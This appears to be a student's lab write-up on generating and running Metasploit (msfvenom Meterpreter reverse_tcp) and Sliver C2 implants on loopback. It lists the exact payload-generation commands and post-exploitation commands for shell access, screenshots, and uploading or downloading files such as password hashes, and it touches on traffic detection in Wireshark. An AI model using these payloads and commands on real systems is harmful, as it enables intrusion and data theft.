# A) Sniff venom
At first I made malicious binaries with msfvenom. I used the following command: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o infected1`  
After the malicious binary was made, i opened multi/handler in msfconsole, and set the LHOST, LPORT and the payload to be the same as the attack payload.  
Then i started up the ran the malicious binary and got a connection to multi/handler.

Now that the connection has been made, i opened wireshark and gave a few random commands in the meterpreter session to see what the traffic looks like

This was the traffic of a single `ls` command. Im not sure how to analyze this. Maybe this can be detected by unusual TCP port?  
# B/C) Hello, Sliver.  
I started out by downloading sliver: `sudo apt-get install sliver`  
After that I ran sliver: `sliver-server`  
Then I generated a malicious payload for linux and set the callback address as loopback: `generate --http 127.0.0.1 --os linux`

After that I started the http listener with the command `http`, and ran the payload.

To interact with the session, I used the command `sessions -i sessionID`

I tried to analyze the traffic once again with wireshark, but I cannot pinpoint anything suspicious about the traffic, maybe once again a weird portnumber?

# D) Changing connection properties.  
While the sessions was alive and I was interacting with it, I used the `help` command to see what kinds of operations I can do in this session.  
The first thing that popped from the list was the command `shell` that upgrades my session to get me shell.

Apparently, this is bad OpSec :D. But I press yes, i'm an adult and got the shell.  
After this, I tried to change the reconnection interval, which was currently set at 1 ms.

I tried this with this command: `reconfig -r 1s`, and it was succesful.

# E) Demonstrating sliver functionalities.  
You can do all sorts of things in sliver. You can display these functionalities with the `help` command.  
For example, you can take a screenshot of the target computer with the `screenshot` command.

With `netstat` you can print out the target computers current connections, useful for lateral movement.

And as demonstrated in a previous point, `shell` can be used to open up an interactive shell.  
`Upload` and `download` commands can be used to upload files from your computer to the target and vice versa, useful if you neet to extract password hashes or other useful data. Or to inject malware to target system.
